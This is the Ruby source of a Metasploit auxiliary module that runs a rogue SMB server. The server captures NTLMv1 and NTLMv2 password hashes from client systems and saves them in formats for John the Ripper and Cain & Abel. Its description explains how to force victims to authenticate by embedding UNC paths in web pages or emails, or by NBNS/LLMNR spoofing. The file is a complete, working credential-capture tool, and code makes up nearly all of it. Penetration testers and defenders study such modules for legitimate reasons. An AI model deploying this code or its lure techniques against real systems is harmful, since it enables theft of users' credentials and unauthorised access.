##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'ruby_smb'
require 'ruby_smb/gss/provider/ntlm'
require 'metasploit/framework/hashes/identify'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::SMB::Server

  def initialize
    super({
      'Name' => 'Authentication Capture: SMB',
      'Description' => %q{
        This module provides a SMB service that can be used to capture the challenge-response
        password NTLMv1 & NTLMv2 hashes used with SMB1, SMB2, or SMB3 client systems.
        Responses sent by this service have by default a random 8 byte challenge string
        of format `\x11\x22\x33\x44\x55\x66\x77\x88`, allowing for easy cracking using
        Cain & Abel (NTLMv1) or John the ripper (with jumbo patch).

        To exploit this, the target system must try to authenticate to this
        module. One way to force an SMB authentication attempt is by embedding
        a UNC path (\\\\SERVER\\SHARE) into a web page or email message. When
        the victim views the web page or email, their system will
        automatically connect to the server specified in the UNC share (the IP
        address of the system running this module) and attempt to
        authenticate. Another option is using auxiliary/spoof/{nbns,llmnr} to
        respond to queries for names the victim is already looking for.

        Documentation of the above spoofing methods can be found by running `info -d`.
      },
      'Author' => [
        'hdm',                 # Author of original module
        'Spencer McIntyre',    # Creator of RubySMB::Server
        'agalway-r7',          # Port of existing module to use RUBYSMB::Server
        'sjanusz-r7',          # Port of existing module to use RUBYSMB::Server
      ],
      'License' => MSF_LICENSE,
      'Actions' => [[ 'Capture', { 'Description' => 'Run SMB capture server' } ]],
      'PassiveActions' => [ 'Capture' ],
      'DefaultAction' => 'Capture'
    })

    register_options(
      [
        OptString.new('CAINPWFILE', [ false, 'Name of file to store Cain&Abel hashes in. Only supports NTLMv1 hashes. Can be a path.', nil ]),
        OptString.new('JOHNPWFILE', [ false, 'Name of file to store JohnTheRipper hashes in. Supports NTLMv1 and NTLMv2 hashes, each of which is stored in separate files. Can also be a path.', nil ]),
        OptString.new('CHALLENGE', [ false, 'The 8 byte server challenge. Set values must be a valid 16 character hexadecimal pattern. If unset a valid random challenge is used.' ], regex: /^([a-fA-F0-9]{16})$/),
        OptString.new('SMBDomain', [ true, 'The domain name used during SMB exchange.', 'anonymous'], aliases: ['DOMAIN_NAME']),
        OptInt.new('TIMEOUT', [ true, 'Seconds that the server socket will wait for a response after the client has initiated communication.', 5])
      ]
    )

    deregister_options('SMBServerIdleTimeout')
  end

  class HashCaptureNTLMProvider < RubySMB::Gss::Provider::NTLM
    def initialize(allow_anonymous: false, default_domain: 'WORKGROUP', listener: nil)
      super(allow_anonymous: allow_anonymous, default_domain: default_domain)
      @listener = listener
    end

    class Authenticator < RubySMB::Gss::Provider::NTLM::Authenticator
      def bin_to_hex(str)
        str.each_byte.map { |b| b.to_s(16).rjust(2, '0') }.join
      end

      def process_ntlm_type1(type1_msg)
        @client_os_version = type1_msg.os_version
        # TODO: write method for mapping +major+ and +minor+ OS values to human-readable OS names.
        # @client_os_version = ::NTLM::OSVersion.read(type1_msg.os_version)
        super
      end

      def process_ntlm_type3(type3_msg)
        _, client = ::Socket.unpack_sockaddr_in(@server_client.getpeername)

        hash_type = nil
        combined_hash = "#{type3_msg.user.encode}::#{type3_msg.domain.encode}"

        case type3_msg.ntlm_version
        when :ntlmv1
          hash_type = 'NTLMv1-SSP'
          client_hash = "#{bin_to_hex(type3_msg.lm_response)}:#{bin_to_hex(type3_msg.ntlm_response)}"

          combined_hash << ":#{client_hash}"
          combined_hash << ":#{bin_to_hex(@server_challenge)}"
        when :ntlmv2
          hash_type = 'NTLMv2-SSP'
          client_hash = "#{bin_to_hex(type3_msg.ntlm_response[0...16])}:#{bin_to_hex(type3_msg.ntlm_response[16..-1])}"

          combined_hash << ":#{bin_to_hex(@server_challenge)}"
          combined_hash << ":#{client_hash}"
        end

        unless hash_type.nil?
          @provider.listener.print_line "[SMB] #{hash_type} Client     : #{client}"
          # @provider.listener.print_line "[SMB] #{hash_type} Client OS  : #{@client_os_version}"
          @provider.listener.print_line "[SMB] #{hash_type} Username   : #{type3_msg.domain.encode}\\#{type3_msg.user.encode}"
          @provider.listener.print_line "[SMB] #{hash_type} Hash       : #{combined_hash}"
          @provider.listener.print_line

          if @provider.listener
            jtr_format = type3_msg.ntlm_version == :ntlmv1 ? JTR_NTLMV1 : JTR_NTLMV2
            @provider.listener.on_cred(
              {
                address: client,
                combined_hash: combined_hash,
                jtr_format: jtr_format,
                username: type3_msg.user.encode,
                server_challenge: @server_challenge,
                client_hash: client_hash,
                domain: type3_msg.domain.encode,
                client_os_version: @client_os_version,
                realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
                realm_value: type3_msg.domain.encode
              }
            )
          end
        end

        ::WindowsError::NTStatus::STATUS_ACCESS_DENIED
      end
    end

    # Needs overwritten to ensure our version of Authenticator is returned
    def new_authenticator(server_client)
      # build and return an instance that can process and track stateful information for a particular connection but
      # that's backed by this particular provider
      Authenticator.new(self, server_client)
    end

    attr_reader :listener
  end

  def on_cred(creds)
    if active_db?
      origin = create_credential_origin_service(
        {
          address: creds[:address],
          port: datastore['SRVPORT'],
          service_name: 'smb',
          protocol: 'tcp',
          module_fullname: fullname,
          workspace_id: myworkspace_id
        }
      )

      # TODO: Re-implement when +creds[:client_os_version]+ can be determined.
      # found_host = framework.db.hosts.find_by(address: address)
      # found_host.os_name = creds[:client_os_version]
      # found_host.save!

      create_credential(
        {
          origin: origin,
          origin_type: :service,
          address: creds[:address],
          service_name: 'smb',
          port: datastore['SRVPORT'],
          private_data: creds[:combined_hash],
          private_type: :nonreplayable_hash,
          jtr_format: creds[:jtr_format],
          username: creds[:username],
          module_fullname: fullname,
          workspace_id: myworkspace_id,
          realm_key: creds[:realm_key],
          realm_value: creds[:realm_value]
        }
      )
    end

    if datastore['JOHNPWFILE']
      path = build_jtr_file_name(creds[:jtr_format])

      File.open(path, 'ab') do |f|
        f.puts(creds[:combined_hash])
      end
    end

    # Cain & Abel doesn't support import of NTLMv2 hashes
    if datastore['CAINPWFILE'] && creds[:jtr_format] == JTR_NTLMV1
      # Cain&Abel hash format
      # Username:Domain:Challenge:LMHash:NTLMHash
      File.open(File.expand_path(datastore['CAINPWFILE'], Msf::Config.install_root), 'ab') do |f|
        f.puts("#{creds[:username]}:#{creds[:domain]}:#{creds[:server_challenge]}:#{creds[:client_hash]}")
      end
    end
  end

  def run
    @rsock = Rex::Socket::Tcp.create(
      'LocalHost' => datastore['SRVHOST'],
      'LocalPort' => datastore['SRVPORT'],
      'Server' => true,
      'Timeout' => datastore['TIMEOUT'],
      'Context' =>
        {
          'Msf' => framework,
          'MsfExploit' => self
        }
    )

    ntlm_provider = HashCaptureNTLMProvider.new(
      listener: self
    )

    # Set domain name for all future server responses
    ntlm_provider.dns_domain = datastore['SMBDomain']
    ntlm_provider.dns_hostname = datastore['SMBDomain']
    ntlm_provider.netbios_domain = datastore['SMBDomain']
    ntlm_provider.netbios_hostname = datastore['SMBDomain']

    if datastore['CHALLENGE']
      # Set challenge for all future server responses

      chall = proc { [datastore['CHALLENGE']].pack('H*') }
      ntlm_provider.generate_server_challenge(&chall)
    end

    if datastore['JOHNPWFILE']
      print_status("JTR hashes will be split into two files depending on the hash format.")
      print_status("#{build_jtr_file_name(JTR_NTLMV1)} for NTLMv1 hashes.")
      print_status("#{build_jtr_file_name(JTR_NTLMV2)} for NTLMv2 hashes.")
      print_line
    end

    if datastore['CAINPWFILE']
      print_status("Cain & Abel hashes will be stored at #{File.expand_path(datastore['CAINPWFILE'], Msf::Config.install_root)}")
      print_line
    end

    server = RubySMB::Server.new(
      server_sock: @rsock,
      gss_provider: ntlm_provider
    )

    print_status("Server is running. Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}")

    server.run do
      print_line
      print_good 'Received SMB connection on Auth Capture Server!'
      true
    end
  end

  def cleanup
    begin
      @rsock.close if @rsock
    rescue => e
      elog('Failed closing SMB server socket', error: e)
    end

    super
  end

  def build_jtr_file_name(jtr_format)
    # JTR NTLM hash format NTLMv1
    # Username::Domain:LMHash:NTHash:Challenge
    #
    # JTR NTLM hash format NTLMv2
    # Username::Domain:Challenge:NTHash[0...16]:NTHash[16...-1]

    path = File.expand_path(datastore['JOHNPWFILE'], Msf::Config.install_root)

    # if the passed file name does not contain an extension
    if File.extname(File.basename(path)).empty?
      path += "_#{jtr_format}"
    else
      path_parts = path.split('.')

      # inserts _jtr_format between the last extension and the rest of the path
      path = "#{path_parts[0...-1].join('.')}_#{jtr_format}.#{path_parts[-1]}"
    end

    path
  end
end
